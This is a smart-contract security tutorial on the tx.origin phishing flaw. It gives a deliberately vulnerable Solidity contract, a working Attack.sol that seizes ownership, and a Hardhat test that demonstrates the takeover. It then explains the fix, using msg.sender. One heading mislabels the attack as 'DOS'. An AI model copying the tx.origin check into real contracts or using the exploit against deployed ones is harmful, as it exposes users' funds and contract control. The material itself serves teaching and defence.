# Attack with tx.origin

tx.origin is a global variable which returns the address that sent the transaction, we will learn how incorrect use of tx.origin could lead to security vulnerabilities in smart contracts

Lets goo 🚀


## What is tx.origin?

`tx.origin` is a global variable which returns the address of the account which sent the transaction. Now you might be wondering then what is `msg.sender` 🤔. The difference is that `tx.origin` refers to the original external account (which is the user) that started the transaction and `msg.sender` is the immediate account that called the function and it can be an external account or another contract calling the function.

So for example, if User calls Contract A, which then calls contract B within the same transaction, `msg.sender` will be equal to `Contract A` when checked from inside `Contract B`. However, `tx.origin` will be the `User` regardless of where you check it from.


## DOS Attack on a smart contract

### What will happen?

There will be two smart contracts - `Good.sol` and `Attack.sol`. `Good.sol`. Initially the owner of `Good.sol` will be a good user. Using the attack function `Attack.sol` will be able to change the owner of `Good.sol` to itself.


### Build

Lets build an example where you can experience how the the attack happens.

- To setup a Hardhat project, Open up a terminal and execute these commands

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```

- If you are not on mac, please do this extra step and install these libraries as well :)

  ```bash
  npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a hardhat project ready to go!

First, let's create a contract named `Good.sol` which is essentially a simpler version of `Ownable.sol` that we have previously used.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract Good  {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setOwner(address newOwner) public {
        require(tx.origin == owner, "Not owner" );
        owner = newOwner;
    }
}
```

Now, create a contract named `Attack.sol` within the `contracts` directory and write the following lines of code

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good public good;
    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOwner(address(this));
    }
}
```

Now lets try immitating the attack using a sample test, create a new file under `test` folder named `attack.js` and add the following lines of code to it

```javascript
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("Attack.sol will be able to change the owner of Good.sol", async function () {
    // Get one address
    const [_, addr1] = await ethers.getSigners();

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.connect(addr1).deploy();
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    let tx = await _attackContract.connect(addr1).attack();
    await tx.wait();

    // Now lets check if the current owner of Good.sol is actually Attack.sol
    expect(await _goodContract.owner()).to.equal(_attackContract.address);
  });
});
```

The attack will happen as follows, initially `addr1` will deploy `Good.sol` and will be the owner but the attacker will somehow fool the user who has the private key of `addr1` to call the `attack` function with `Attack.sol`. 

When the user calls `attack` function with `addr1`,  `tx.origin` is set to `addr1`. `attack` function further calls `setOwner` function of `Good.sol` which first checks if `tx.origin` is indeed the owner which is `true` because the original transaction was indeed called by `addr1`. After verifying the owner, it sets the owner to `Attack.sol` 

And thus attacker is successfully able to change the owner of `Good.sol` 🤯

To run the test, in your terminal pointing to the root directory of this level execute the following command

```bash
npx hardhat test
```

When the tests pass, you will notice that the owner of `Good.sol` is now `Attack.sol`

## Real Life Example
While this may seem obvious to most of you, as `tx.origin` isn't something you see being used at all, some developers do make this mistake. You can read about the [THORChain Hack #2 here](https://rekt.news/thorchain-rekt2/) where users lost millions in $RUNE due to an attacker being able to get approvals on $RUNE token by sending a fake token to user's wallets, and approving that token for sale on Uniswap would transfer $RUNE from the user's wallet to the attacker's wallet because THORChain used `tx.origin` for transfer checks instead of `msg.sender`.

## Prevention

- You should use `msg.sender` instead of `tx.origin` to not let this happen

Example:

```solidity

function setOwner(address newOwner) public {
    require(msg.sender == owner, "Not owner" );
    owner = newOwner;
}

```

Hope you liked this level ❤️, keep building.

WAGMI 🚀


## References
- [Solidity by example](https://solidity-by-example.org/)
